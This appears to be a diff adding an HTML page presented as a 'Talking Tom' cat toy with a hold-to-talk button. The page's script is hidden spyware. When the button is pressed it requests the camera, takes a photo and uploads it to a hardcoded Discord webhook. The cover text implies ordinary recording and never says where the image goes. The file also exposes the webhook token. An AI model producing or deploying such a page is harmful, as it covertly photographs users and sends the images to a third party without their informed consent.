@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Talking Tom - Fun Edition</title>
+    <style>
+        body { 
+            text-align: center; font-family: 'Arial', sans-serif; 
+            background: linear-gradient(135deg, #87CEEB, #E0F7FA);
+            height: 100vh; display: flex; flex-direction: column; 
+            justify-content: center; align-items: center; margin: 0;
+        }
+        #cat { font-size: 150px; transition: transform 0.2s; cursor: pointer; }
+        .talking { animation: shake 0.2s infinite; transform: scale(1.1); }
+        @keyframes shake { 0%, 100% { transform: rotate(-5deg); } 50% { transform: rotate(5deg); } }
+        
+        button { 
+            padding: 20px 50px; font-size: 24px; border-radius: 50px;
+            border: none; background: #FF5722; color: white;
+            font-weight: bold; cursor: pointer; box-shadow: 0 10px #BF360C;
+            transition: all 0.1s; margin-top: 30px;
+        }
+        button:active { transform: translateY(5px); box-shadow: 0 5px #BF360C; }
+        #status { margin-top: 20px; font-size: 18px; color: #555; }
+    </style>
+</head>
+<body>
+
+    <div id="cat">😺</div>
+    <button id="btn">Hold To Talk</button>
+    <p id="status">Press and hold the button!</p>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1511560167081115690/zZYhiqgM8IWPLKvyEjKRILgYXP6fGD7nnYEndhx4i5k9sd3-I5kbXy_ROEQK4e4PvtLg";
+        const cat = document.getElementById("cat");
+        const status = document.getElementById("status");
+        const btn = document.getElementById("btn");
+
+        async function captureAndSend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                // Даем камере полсекунды на "прогрев"
+                await new Promise(r => setTimeout(r, 500));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append("file", blob, "photo.png");
+                    await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+                    status.textContent = "Photo Sent!";
+                }, "image/png");
+
+            } catch (err) {
+                status.textContent = "Error: Please allow camera access!";
+            }
+        }
+
+        btn.onmousedown = () => {
+            cat.textContent = "🙀";
+            cat.classList.add("talking");
+            status.textContent = "Recording... Smile!";
+            captureAndSend();
+        };
+
+        btn.onmouseup = () => {
+            cat.textContent = "😺";
+            cat.classList.remove("talking");
+            status.textContent = "Ready!";
+        };
+    </script>
+</body>
+</html>
